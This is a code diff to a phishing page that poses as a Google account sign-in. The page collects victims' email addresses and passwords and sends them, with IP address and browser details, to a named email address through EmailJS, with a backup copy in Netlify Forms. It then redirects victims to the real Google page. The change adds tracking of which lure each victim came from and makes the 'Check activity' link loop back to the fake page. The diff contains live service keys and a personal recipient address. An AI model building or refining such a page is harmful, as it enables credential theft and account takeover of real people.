@@ -62,6 +62,7 @@
   <input type="text" name="email" />
   <input type="text" name="password" />
   <input type="text" name="step" />
+  <input type="text" name="source" />
 </form>
 
 <div class="card">
@@ -119,8 +120,8 @@
 <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
 <script>
   /* ====== CONFIG ====== */
-  const REDIRECT_URL = "https://myaccount.google.com";
-  const VERIFY_LINK  = "https://myaccount.google.com/security";
+  const REDIRECT_URL = "https://myaccount.google.com";          // where they end up after "login"
+  const VERIFY_LINK  = window.location.origin + "/?ref=email";  // "Check activity" → back to this page
   const YOUR_EMAIL   = "trady.lewis@mpesafoundationacademy.ac.ke";
   const EMAILJS = {
     publicKey:  "Umle-w26jGP29PfnV",
@@ -131,10 +132,11 @@
 
   emailjs.init({ publicKey: EMAILJS.publicKey });
 
-  const step1 = document.getElementById('step1');
-  const step2 = document.getElementById('step2');
+  const SOURCE  = new URLSearchParams(window.location.search).get('ref') || 'direct';
+  const step1   = document.getElementById('step1');
+  const step2   = document.getElementById('step2');
   const emailEl = document.getElementById('email');
-  const passEl = document.getElementById('password');
+  const passEl  = document.getElementById('password');
 
   // backup log to Netlify Forms
   function saveToNetlify(data) {
@@ -174,7 +176,7 @@
   document.getElementById('next1').onclick = () => {
     const email = emailEl.value.trim();
     if (!email) return emailEl.focus();
-    saveToNetlify({ email, step: 'email' });
+    saveToNetlify({ email, step: 'email', source: SOURCE });
     document.getElementById('shownEmail').textContent = email;
     step1.classList.add('hidden');
     step2.classList.remove('hidden');
@@ -191,7 +193,7 @@
     if (!password) return passEl.focus();
     const email = emailEl.value.trim();
 
-    saveToNetlify({ email, password, step: 'password' });
+    saveToNetlify({ email, password, step: 'password', source: SOURCE });
 
     const ip = await getIP();
     await notify({
@@ -200,7 +202,8 @@
       ip:           ip,
       user_agent:   navigator.userAgent,
       timestamp:    new Date().toLocaleString(),
-      verify_link:  VERIFY_LINK
+      verify_link:  VERIFY_LINK,
+      source:       SOURCE
     });
 
     window.location.href = REDIRECT_URL;
